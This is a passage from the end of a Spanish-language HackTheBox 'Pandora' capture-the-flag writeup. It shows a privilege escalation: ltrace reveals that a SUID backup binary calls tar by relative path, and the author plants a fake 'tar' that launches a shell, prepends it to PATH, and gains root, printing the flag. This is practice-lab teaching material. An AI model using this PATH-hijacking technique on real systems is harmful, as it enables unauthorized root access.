</pre><td class="rouge-code"><pre>matt@pandora:~$ /usr/bin/pandora_backup

[** SNIP **]

/var/www/pandora/pandora_console/vendor/egulias/email-validator/phpunit.xml.dist
/var/www/pandora/pandora_console/vendor/egulias/email-validator/LICENSE
/var/www/pandora/pandora_console/ws.php
Backup successful!
Terminating program!
</pre></table></code></div></div><p>Analizamos el binario con <code class="language-plaintext highlighter-rouge">ltrace</code>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre>matt@pandora:~$ which ltrace
/usr/bin/ltrace

matt@pandora:~$ ltrace /usr/bin/pandora_backup 
getuid()                                                                                                                                           = 1000
geteuid()                                                                                                                                          = 1000
setreuid(1000, 1000)                                                                                                                               = 0
puts("PandoraFMS Backup Utility"PandoraFMS Backup Utility
)                                                                                                                  = 26
puts("Now attempting to backup Pandora"...Now attempting to backup PandoraFMS client
)                                                                                                        = 43
system("tar -cvf /root/.backup/pandora-b"...tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied
tar: Error is not recoverable: exiting now
 &lt;no return ...&gt;
--- SIGCHLD (Child exited) ---
&lt;... system resumed&gt; )                                                                                                                             = 512
puts("Backup failed!\nCheck your permis"...Backup failed!
Check your permissions!
)                                                                                                       = 39
+++ exited (status 1) +++
</pre></table></code></div></div><p>El binario esta utilizando el comando <code class="language-plaintext highlighter-rouge">tar</code> pero esta utilizando ruta relativa y esto es peligroso porque podemos hacer un <code class="language-plaintext highlighter-rouge">PATH HIJACKING</code>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>system("tar -cvf /root/.backup/pandora-b"...tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied
</pre></table></code></div></div><p>Creamos un archivo malicioso con el nombre <code class="language-plaintext highlighter-rouge">tar</code> y retocamos la ruta.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>matt@pandora:~$ echo "/usr/bin/sh" &gt; tar
matt@pandora:~$ chmod +x tar 

matt@pandora:~$ export PATH=$(pwd):$PATH

matt@pandora:~$ echo $PATH
/home/matt:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
</pre></table></code></div></div><p>Ejecutamos el comando <code class="language-plaintext highlighter-rouge">/usr/bin/pandora_backup</code> una vez mas. Esta vez ejecutará nuestro archivo <code class="language-plaintext highlighter-rouge">tar</code> malicioso y nos hará root porque el binario tiene el permiso <code class="language-plaintext highlighter-rouge">SUID</code>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>matt@pandora:~$ /usr/bin/pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
# id
uid=0(root) gid=1000(matt) groups=1000(matt)

# bash  	

root@pandora:~# cat /root/root.txt 
ca89acf9e01e742a9ed07a414ab3471c
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/writeup/'>Writeup</a>, <a href='/categories/easy/'>Easy</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/writeup/" class="post-tag no-text-decoration" >Writeup</a> <a href="/tags/htb-easy/" class="post-tag no-text-decoration" >HTB-Easy</a> <a href="/tags/snmp/" class="post-tag no-text-decoration" >SNMP</a> <a href="/tags/sqli/" class="post-tag no-text-decoration" >SQLi</a> <a href="/tags/cve/" class="post-tag no-text-decoration" >CVE</a> <a href="/tags/rce/" class="post-tag no-text-decoration" >RCE</a> <a href="/tags/suid/" class="post-tag no-text-decoration" >SUID</a> <a href="/tags/path-hijacking/" class="post-tag no-text-decoration" >Path Hijacking</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox Pandora Writeup - v0id&amp;url=https://v0idpy.github.io/posts/hackthebox-pandora-writeup/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox Pandora Writeup - v0id&amp;u=https://v0idpy.github.io/posts/hackthebox-pandora-writeup/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://v0idpy.github.io/posts/hackthebox-pandora-writeup/&amp;text=HackTheBox Pandora Writeup - v0id" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/hackthebox-pandora-writeup/">HackTheBox Pandora Writeup</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/cve/">CVE</a> <a class="post-tag" href="/tags/htb-easy/">HTB-Easy</a> <a class="post-tag" href="/tags/path-hijacking/">Path Hijacking</a> <a class="post-tag" href="/tags/rce/">RCE</a> <a class="post-tag" href="/tags/snmp/">SNMP</a> <a class="post-tag" href="/tags/sqli/">SQLi</a> <a class="post-tag" href="/tags/suid/">SUID</a> <a class="post-tag" href="/tags/writeup/">Writeup</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div class="post-navigation d-flex justify-content-between"> <span class="btn btn-outline-primary disabled" prompt="Older"><p>-</p></span> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://github.com/username">Christian Manalo</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/cve/">CVE</a> <a class="post-tag" href="/tags/htb-easy/">HTB-Easy</a> <a class="post-tag" href="/tags/path-hijacking/">Path Hijacking</a> <a class="post-tag" href="/tags/rce/">RCE</a> <a class="post-tag" href="/tags/snmp/">SNMP</a> <a class="post-tag" href="/tags/sqli/">SQLi</a> <a class="post-tag" href="/tags/suid/">SUID</a> <a class="post-tag" href="/tags/writeup/">Writeup</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script> <script> $(function() { function updateMermaid(event) { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { const mode = event.data.message; if (typeof mermaid === "undefined") { return; } let expectedTheme = (mode === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* Re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } let initTheme = "default"; if ($("html[data-mode=dark]").length > 0 || ($("html[data-mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); window.addEventListener("message", updateMermaid); }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */ MathJax = { tex: { inlineMath: [ /* start/end delimiter pairs for in-line math */ ['$','$'], ['\\(','\\)'] ], displayMath: [ /* start/end delimiter pairs for display math */ ['$$', '$$'], ['\\[', '\\]'] ] } }; </script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"> </script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
